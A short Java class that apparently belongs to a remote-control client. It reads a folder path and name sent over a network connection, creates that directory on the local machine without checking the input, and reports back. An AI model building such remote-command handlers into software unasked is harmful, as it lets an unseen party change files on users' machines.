package com.redpois0n.packets;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.Constants;


public class PacketMKDIR extends Packet {

	@Override
	public void read(String line) throws Exception {
		String where = Connection.readLine();
		String name = Connection.readLine();
		
		File file = new File(where + File.separator + name);
		file.mkdirs();
		Connection.status(Constants.STATUS_MKDIR);
	}

}
